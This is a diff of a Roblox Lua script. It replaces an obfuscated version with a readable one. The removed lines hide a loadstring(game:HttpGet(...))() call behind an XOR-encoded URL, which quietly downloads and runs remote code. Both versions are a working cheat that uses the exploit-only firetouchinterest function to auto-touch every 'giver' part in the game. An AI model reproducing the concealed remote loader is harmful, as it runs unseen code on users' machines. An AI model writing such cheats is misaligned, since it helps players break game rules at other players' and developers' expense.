@@ -1,12 +1,24 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
+local lastTime = 0
+local interval = 0.1
 
-]]--
+game:GetService("RunService").Heartbeat:Connect(function()
+    if tick() - lastTime >= interval then
+        lastTime = tick()
 
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v10,v11) local v12={};for v13=1, #v10 do v6(v12,v0(v4(v1(v2(v10,v13,v13 + 1 )),v1(v2(v11,1 + (v13% #v11) ,1 + (v13% #v11) + 1 )))%256 ));end return v5(v12);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\225\11\222\246\224\54\240\249\242\17\199\153\136\36\223\219\244\35\224\178\196\23\208\207\148\40\231\178\201\81\226\194\221\32","\126\177\163\187\69\134\219\167")))();local v8=490 -(59 + 431) ;local v9=727.1 -(433 + 294) ;game:GetService(v7("\17\216\36\246\249\49\219\35\198\249","\156\67\173\74\165")).Heartbeat:Connect(function() if ((tick() -v8)>=v9) then local v14=1846 -(1228 + 618) ;local v15;local v16;while true do if (v14==(0 -0)) then v15=0 -0 ;v16=nil;v14=953 -(802 + 150) ;end if (v14==1) then while true do if (v15==(0 + 0)) then local v17=0 -0 ;while true do if (v17==0) then v8=tick();v16=game.Players.LocalPlayer.Character;v17=1 -0 ;end if (v17==(792 -(368 + 423))) then v15=1 + 0 ;break;end end end if (v15==(998 -(915 + 82))) then if (v16 and v16:FindFirstChild(v7("\28\162\68\23\178\41\79\48\133\70\25\168\22\71\38\163","\38\84\215\41\118\220\70"))) then for v19,v20 in pairs(workspace:GetDescendants()) do if (v20:IsA(v7("\96\23\48\6","\158\48\118\66\114")) and v20.Name:lower():find(v7("\172\45\6\51\97","\155\203\68\112\86\19\197"))) then local v21=0;while true do if (v21==(2 -1)) then firetouchinterest(v16.HumanoidRootPart,v20,1 + 0 );break;end if ((0 -0)==v21) then firetouchinterest(v16.HumanoidRootPart,v20,0 -0 );wait(0.05 -0 );v21=1188 -(1069 + 118) ;end end end end end break;end end break;end end end end);game.Players.LocalPlayer.CharacterAdded:Connect(function() wait(0.1 + 0 );v8=tick();end);
+        local char = game.Players.LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            for _, part in pairs(workspace:GetDescendants()) do
+                if part:IsA("Part") and part.Name:lower():find("giver") then
+                    firetouchinterest(char.HumanoidRootPart, part, 0)
+                    wait(0.05)
+                    firetouchinterest(char.HumanoidRootPart, part, 1)
+                end
+            end
+        end
+    end
+end)
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+    wait(0.1)
+    lastTime = tick()
+end)
